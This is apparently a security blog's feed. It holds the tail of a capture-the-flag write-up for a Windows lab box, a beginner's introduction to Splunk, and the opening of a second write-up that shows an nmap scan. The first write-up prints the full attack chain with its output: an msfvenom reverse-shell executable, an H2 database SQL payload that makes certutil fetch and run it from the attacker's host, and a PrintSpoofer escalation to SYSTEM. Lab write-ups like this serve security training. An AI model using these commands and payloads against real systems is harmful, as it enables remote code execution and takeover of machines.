    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/x64/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.49.60 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; exe &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; WebIIS.exe                                                                                     130 ⨯ 1 ⚙
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] No &lt;span class=&quot;nb&quot;&gt;arch &lt;/span&gt;selected, selecting &lt;span class=&quot;nb&quot;&gt;arch&lt;/span&gt;: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: WebIIS.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;We host a web server to transfer our payload, and also set up a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; listener to catch the reverse shell.
    &lt;ul&gt;
      &lt;li&gt;On the first terminal, execute the following command to host a web server on port 8082.
        &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 8082
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;On the second terminal, we kickoff a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; listener on port 80.
        &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Finally, we run the following payload to achieve command execution.
    &lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR &quot;JNIScriptEngine.eval&quot;;
CALL JNIScriptEngine_eval(&apos;new java.util.Scanner(java.lang.Runtime.getRuntime().exec(&quot;certutil -f -urlcache -split &lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;http://192.168.49.60:8082/WebIIS.exe&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;Windows&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;Temp&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;WebIIS.exe&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&quot;).getInputStream()).useDelimiter(&quot;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;Z&quot;).next()&apos;);CALL JNIScriptEngine_eval(&apos;new java.util.Scanner(java.lang.Runtime.getRuntime().exec(&quot;C:&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;Windows&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;Temp&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;WebIIS.exe&quot;).getInputStream()).useDelimiter(&quot;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;Z&quot;).next()&apos;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;If everything works properly, the reverse connection should be established at port 80 as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tony&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 80  
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 80 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.49.234] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.234.66] 49770
Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.18363.836]
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2019 Microsoft Corporation. All rights reserved.

C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;2&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ervice&amp;gt;set &lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%SystemRoot%&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;%SystemRoot%&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%SystemRoot%&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;%SystemRoot%&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;2&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ervice&amp;gt;whoami
&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;jacko&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;ony
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;administrative-privilege-escalation&quot;&gt;&lt;strong&gt;Administrative Privilege Escalation&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;A misconfigured privilege token is set for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tony&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;2&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ervice&amp;gt;whoami /priv
&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; /priv

PRIVILEGES INFORMATION
&lt;span class=&quot;nt&quot;&gt;----------------------&lt;/span&gt;

Privilege Name                Description                               State   
&lt;span class=&quot;o&quot;&gt;=============================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=========================================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;========&lt;/span&gt;
...
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can abuse it to escalate our privilege with the support of &lt;a href=&quot;https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PrintSpoofer&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;All we have to do is finding a way to transfer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PrintSpoofer&lt;/code&gt; to the target system. This can be done with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;certutil&lt;/code&gt; utility.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;2&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ervice&amp;gt;certutil &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-split&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.49.234:8082/PrintSpoofer64.exe&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Temp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;PrintSpoofer64.exe&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;certutil &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-split&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.49.234:8082/PrintSpoofer64.exe&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Temp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;PrintSpoofer64.exe&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;  Online  &lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;
  0000  ...
  6a00
CertUtil: &lt;span class=&quot;nt&quot;&gt;-URLCache&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As the file is successfully transfered, we execute the following command …&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;2&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ervice&amp;gt;C:&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;Windows&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;Temp&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;PrintSpoofer64.exe &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; cmd
C:&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;Windows&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;Temp&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;PrintSpoofer64.exe &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; cmd
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Found privilege: SeImpersonatePrivilege
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Named pipe listening...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] CreateProcessAsUser&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; OK
Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.18363.836]
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2019 Microsoft Corporation. All rights reserved.

C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and become &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrator&lt;/code&gt;.&lt;/p&gt;</content><author><name></name></author><category term="ctf" /><category term="pg" /><category term="windows" /><summary type="html">Summary Of Result As enumerating, we discover a vulnerable H2 database with a default credentials running on the target system, which leads to Remote Code Execution. We can then escalate our privilege by abusing misconfigured SeImpersonatePrivilege token.</summary></entry><entry><title type="html">Splunk - Introduction</title><link href="https://jayngng.github.io/blog/splunk-introduction/" rel="alternate" type="text/html" title="Splunk - Introduction" /><published>2021-08-17T08:43:35+10:00</published><updated>2021-08-17T08:43:35+10:00</updated><id>https://jayngng.github.io/blog/splunk---introduction</id><content type="html" xml:base="https://jayngng.github.io/blog/splunk-introduction/">&lt;h1 id=&quot;introduction-to-splunk&quot;&gt;Introduction to Splunk&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Splunk is described as a solution to aggregate, analyze and extract valuable infomration of machine data from any source.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Splunk can be used for &lt;strong&gt;Application Management&lt;/strong&gt;, &lt;strong&gt;Operations Management&lt;/strong&gt;, &lt;strong&gt;Security&lt;/strong&gt; &amp;amp; &lt;strong&gt;Compliance&lt;/strong&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;When it comes to security, Splunk can be used as a log management soultion. Splunk can enhance investigations of dynamic, multi-step attacks with detailed visualizations and even enhance an organization’s detection capabilities through User Behavior Analytics.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Splunk can swallow any data from almost any source, through both an agent-less and a forwarder approach.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/splunk/data_type.png&quot; title=&quot;splunk/data_type.png&quot; alt=&quot;splunk/data_type.png&quot; /&gt;
          &lt;/div&gt;

&lt;h4 id=&quot;splunk-architecture-overview&quot;&gt;Splunk Architecture Overview&lt;/h4&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/splunk/architecture.png&quot; title=&quot;splunk/architecture.png&quot; alt=&quot;splunk/architecture.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Splunk architectures consist of:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Forwarder&lt;/strong&gt; component:
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;&lt;strong&gt;Universal Forwarders&lt;/strong&gt;: collect data from remote sources and send them to one or more Splunk Indexers. They are separate downloads that can be installed on any source, less impact on network or host performance.&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;&lt;strong&gt;Heavy Forwarders&lt;/strong&gt;: also collect data from remote sources, but they are typically used for heavy data aggregation tasks, from sources like firewalls or data routing/filtering passing points. According to Splexicon, heavy forwarders parse data beforce forwarding them and can route data based on criteria such as source or type of event. They can also index data locally while forwarding the data to another indexer. Heavy Forwarders are usually run as &lt;strong&gt;data collection nodes&lt;/strong&gt; for &lt;strong&gt;API/scripted&lt;/strong&gt; data access, and they are only compatible with &lt;strong&gt;Splunk Enterprise&lt;/strong&gt;.&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;&lt;strong&gt;Universal Forwarders&lt;/strong&gt; is mainly used for small amount of data? while &lt;strong&gt;Heavy Forwarders&lt;/strong&gt; is good for large amount of data that requires heavy filtering?&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;Note&lt;/em&gt;: &lt;strong&gt;HTTP Event Collector&lt;/strong&gt; (&lt;strong&gt;HECs&lt;/strong&gt;) also exists to collect data directly from applications, at-scale, through a token-based JSON or raw API way.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Indexer&lt;/strong&gt; component
    &lt;ul&gt;
      &lt;li&gt;The Indexer &lt;strong&gt;processes machine data&lt;/strong&gt;, storing the results in indexes as events, enabling fast search and analysis. As the indexer indexes data, it creates a number of files organized in sets of directories by age. Each directory contains raw data (compressed) and indexes (points to the raw data).&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Seach Head&lt;/strong&gt; component
    &lt;ul&gt;
      &lt;li&gt;The &lt;strong&gt;Seach Head&lt;/strong&gt; component allows users to use the Seach language to search for indexed data. It distributes user search requests to the Indexers and consolidates the results as well as extracts field value pairs from the vents to the users. Knowledge Objects on the Seach Head can be created to extract additional fields and transform the data without changing the underlying index data. It should be noted that Seach Head also provide tools to enhace the search experience such as reports, dashboards, and visualizations.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;splunk-apps-and-technology-add-ons-tas&quot;&gt;Splunk Apps and Technology Add-ons (TAs)&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Splunk Apps&lt;/strong&gt; are designed to address a wide variety of use cases and to extend the power of Splunk. Essentially, they are collections of files containing data inputs, UI elements, and/or knowledge objects. Splunk Apps also allow multiple workspaces for difference use cases/user roles to co-exist on a single Splunk instance.&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;Apps are available at &lt;strong&gt;Splunkbase&lt;/strong&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Splunk Technology Add-ons abstract the collection methodology and they are typically include relevant field extractions. They also include relevant config files (props/transforms) and ancillary scripts binaries.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;splunk-users-and-roles&quot;&gt;Splunk Users and Roles&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;Splunk users are assigned roles which determine their capabilities and data access. There are three main roles:
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;admin&lt;/strong&gt;: This role has the most capabilities assigned to it.&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;power&lt;/strong&gt;: This role can edit all shared objects (saved searches, etc) and alerts, tag events, and other similar tasks.&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;user&lt;/strong&gt;: This role can create and edit its own saved searches, run searches, edit its own references, create and edit event types. and other similar tasks.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;splunks-search-and-reporting-app&quot;&gt;Splunk’s Search and Reporting App&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;Navigation&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/splunk/navigation1.png&quot; title=&quot;splunk/navigation1.png&quot; alt=&quot;splunk/navigation1.png&quot; /&gt;
          &lt;/div&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/splunk/navigation2.png&quot; title=&quot;splunk/navigation2.png&quot; alt=&quot;splunk/navigation2.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Data Summary&lt;/strong&gt; will summary data of hosts, sources or sourcetypes.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/splunk/navigation3.png&quot; title=&quot;splunk/navigation3.png&quot; alt=&quot;splunk/navigation3.png&quot; /&gt;
          &lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;This is how the &lt;strong&gt;Events&lt;/strong&gt; might look like.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/splunk/navigation4.png&quot; title=&quot;splunk/navigation4.png&quot; alt=&quot;splunk/navigation4.png&quot; /&gt;
          &lt;/div&gt;

&lt;h6 id=&quot;splunks--search-processing-language-spl&quot;&gt;&lt;strong&gt;Splunk’s  Search Processing Language (SPL)&lt;/strong&gt;:&lt;/h6&gt;
&lt;ul&gt;
  &lt;li&gt;SPL combines the best capabilities of SQL with the Unix pipeline syntax that allows you to:
    &lt;ul&gt;
      &lt;li&gt;Access all data in its original format.&lt;/li&gt;
      &lt;li&gt;Optimize for time-series events.&lt;/li&gt;
      &lt;li&gt;Use the same language for visualizations.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;SPL provides over 140 commands that allow user to search, correlate, analyze and visualize any data.&lt;/p&gt;

&lt;p&gt;Example of SPL:&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/splunk/SPL_syntax.png&quot; title=&quot;splunk/SPL_syntax.png&quot; alt=&quot;splunk/SPL_syntax.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Searches are created based of &lt;strong&gt;five main components&lt;/strong&gt;:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Search term&lt;/strong&gt;: where you specify what you are looking for. Search terms contain keywords, phrases, Booleans, etc.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Command&lt;/strong&gt;: where you specify how you want to manipulate the result. For example, create a visualization, chart or statistic, etc…&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Functions&lt;/strong&gt;: where you specify how exactly do you want to chart, compute or evaluate the results.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Arguments&lt;/strong&gt;: in case there are variables you want to apply to a function.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Clauses&lt;/strong&gt;: where you specify how exactly you want to group or rename the fields in the results.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;As you notice, there are some search string are automatically colored. The color is based on the synxtax. As the following image:&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/splunk/SPL_syntax2.png&quot; title=&quot;splunk/SPL_syntax2.png&quot; alt=&quot;splunk/SPL_syntax2.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Something else to consider while submitting searches is Splunk’s search modes.&lt;/p&gt;

&lt;p&gt;There are three main search modes:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Fast Mode&lt;/strong&gt;: Field discovery off for event searches. No event or field data for stats searches.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Smart Mode&lt;/strong&gt;: Field discovery on for event searches. No event or field data for stats searches. (recommended* for beginner)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Verbose Mode&lt;/strong&gt;: All event &amp;amp; field data.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="splunk" /><category term="siem" /><category term="soc" /><summary type="html">Introduction to Splunk Splunk is described as a solution to aggregate, analyze and extract valuable infomration of machine data from any source.</summary></entry><entry><title type="html">Zino - OSPG</title><link href="https://jayngng.github.io/blog/zino-ospg/" rel="alternate" type="text/html" title="Zino - OSPG" /><published>2021-08-16T03:45:34+10:00</published><updated>2021-08-16T03:45:34+10:00</updated><id>https://jayngng.github.io/blog/zino---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/zino-ospg/">&lt;h1 id=&quot;summary-of-result&quot;&gt;&lt;strong&gt;Summary Of Result&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;We exploit the vulnerable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Booked Scheduler CMS&lt;/code&gt; to obtain the initial access. We then escalate our privilege through a crontab service that will execute a python file of our control.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;attack-narrative&quot;&gt;&lt;strong&gt;Attack Narrative&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;The attack is mounted in three main phases:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Enumeration.&lt;/li&gt;
  &lt;li&gt;Exploitation.&lt;/li&gt;
  &lt;li&gt;Privilege Escalation.&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;nmap&quot;&gt;&lt;strong&gt;Nmap&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;We will start with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;

PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 3.0.3
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 b2:66:75:50:1b:18:f5:e9:9f:db:2c:d4:e3:95:7a:44 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
